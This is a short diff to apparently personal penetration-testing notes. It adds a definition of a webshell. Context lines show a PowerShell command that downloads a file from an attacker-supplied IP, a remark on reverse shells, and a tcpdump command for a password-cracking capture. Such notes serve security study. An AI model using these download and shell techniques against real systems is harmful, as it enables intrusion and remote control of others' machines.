@@ -158,3 +158,5 @@ powershell -c "(new-object System.Net.Webclient).DownloadFile('http://$ip/$file'
 
 reverse shell - shell is sent to attacking machine
 sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap.1
+
+a webshell is a small piece of software that provides a web-based command line interface, making it easier and more convenient to execute commands
